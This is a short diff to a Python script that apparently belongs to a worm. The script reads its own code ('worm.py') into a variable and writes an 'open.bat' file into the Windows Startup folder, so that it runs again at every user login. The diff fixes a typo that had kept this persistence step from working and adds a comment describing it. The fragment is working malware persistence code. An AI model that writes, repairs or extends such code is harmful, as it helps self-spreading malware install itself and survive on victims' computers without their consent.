@@ -14,12 +14,13 @@ with open("worm.py", "rb") as infile:
         break
     WORM_BIN += info
 
+# To be executed upon login to OS
 USER_NAME = environ["USERNAME"]
 target_path = ospath.realpath(__file__)
 bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
 
 with open(bat_path + '\\' + "open.bat", "w") as bat_file:
-    bat_file.write(d'start "" {target_path}')
+    bat_file.write(f'start "" {target_path}')
 
     
 chdir('/')
